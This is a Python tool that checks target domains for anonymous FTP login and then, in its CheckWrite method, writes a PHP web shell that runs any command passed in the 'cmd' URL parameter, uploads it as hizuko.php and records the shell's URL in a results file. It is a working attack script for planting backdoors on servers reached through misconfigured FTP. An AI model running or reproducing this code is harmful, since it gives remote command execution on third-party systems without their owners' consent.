import ftplib
import colorama
import attrs


@attrs.define
class CheckFTP:
    """
    check FTP anonymous login
    """

    url: str = None

    def CheckLogin(self) -> bool | str:
        """
        Check anonymous login
        """
        try:
            ftp_server = "ftp." + self.url

            print(colorama.Fore.YELLOW + "[+] Checking FTP anonymous login on " + ftp_server + colorama.Fore.RESET)
            ftp = ftplib.FTP(ftp_server)
            ftp.connect(ftp_server, port=21, timeout=5)
            check_login = ftp.login()
            if "230" in check_login:
                print(colorama.Fore.GREEN + "[+] FTP anonymous login is available" + colorama.Fore.RESET)
                ftp.quit()
                return True
            else:
                ftp.quit()
                return colorama.Fore.RED + "[-] FTP anonymous login is not available" + colorama.Fore.RESET
        except ftplib.all_errors:
            return colorama.Fore.RED + "[-] FTP anonymous login is not available" + colorama.Fore.RESET

    def CheckWrite(self) -> bool | str:
        """
        Check Anonymous Write
        """
        mini_execute_shell = """
        <?php

        $cmd = $_GET['cmd'];
        system($cmd);

        ?>
        """
        try:
            if self.CheckLogin():
                ftp_server = "ftp." + self.url
                try:
                    ftp = ftplib.FTP(ftp_server)
                    ftp.connect(ftp_server, port=21, timeout=5)
                    ftp.login()
                    # upload mini shell without create folder
                    file = open("hizuko.php", "w")
                    file.write(mini_execute_shell)
                    file.close()

                    ftp.storlines("STOR hizuko.php", open("hizuko.php", "rb"))

                    # check mini shell
                    check_file = ftp.nlst()
                    if "hizuko.php" in check_file:
                        print(colorama.Fore.GREEN + "[+] Upload mini shell success" + colorama.Fore.RESET)

                        with open('../result/shell_uploaded.txt', 'a') as f:
                            f.write("http://" + ftp_server + "/hizuko.php" + '\n')
                        return True
                    ftp.quit()
                    return colorama.Fore.RED + "[-] Failed upload mini shell" + colorama.Fore.RESET
                except Exception:
                    return colorama.Fore.RED + "[-] Failed upload mini shell" + colorama.Fore.RESET
            else:
                return colorama.Fore.RED + "[-] FTP anonymous login is not available" + colorama.Fore.RESET
        except Exception:
            pass
            


